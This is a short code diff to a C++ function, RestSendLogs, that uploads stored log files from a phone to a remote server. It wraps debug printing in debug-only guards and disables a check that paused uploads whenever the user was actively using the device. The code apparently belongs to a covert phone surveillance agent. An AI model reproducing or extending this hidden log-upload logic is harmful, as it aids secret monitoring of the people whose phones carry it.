@@ -2054,9 +2054,10 @@ BOOL Transfer::RestSendLogs() {
 			uberlogObj->Delete((*iter).strLog);	
 			continue;
 		}
-
+#ifdef _DEBUG
 	WCHAR msg[256];
 	swprintf_s(msg, L"Debug - Transfer.cpp - RestSendLogs() sending log file:%s\n",(*iter).strLog.c_str());OutputDebugString(msg);
+#endif
 		
 		DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() sending log file\n", 6, FALSE);
 
@@ -2105,8 +2106,9 @@ BOOL Transfer::RestSendLogs() {
 
 		PBYTE pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);
 
-
+#ifdef _DEBUG
 	swprintf_s(msg, L"Debug - Transfer.cpp - RestSendLogs() b.getPos():%i uResponse:%i\n", b.getPos(), uResponse);OutputDebugString(msg);
+#endif
 
 
 		if (pResponse == NULL) {
@@ -2133,15 +2135,16 @@ BOOL Transfer::RestSendLogs() {
 			return FALSE;
 		}
 
-		// Usciamo dal loop se l'utente riprende ad interagire col telefono
-#ifndef _DEBUG
-		if (deviceObj->IsDeviceUnattended() == FALSE) {
-			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [Power status changed] [9]\n", 5, FALSE);
-			delete[] pData;
-			ClearLogSnapshot();
-			return FALSE;
-		}
-#endif
+// BYGIO ho eliminato questo codice per sfruttare al massimo la trasmissione e' perche' in release mode craschava sul delete
+//		// Usciamo dal loop se l'utente riprende ad interagire col telefono
+//#ifndef _DEBUG
+//		if (deviceObj->IsDeviceUnattended() == FALSE) {
+//			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [Power status changed] [9]\n", 5, FALSE);
+//			delete[] pData;
+//			ClearLogSnapshot();
+//			return FALSE;
+//		}
+//#endif
 	}
 
 	ClearLogSnapshot();
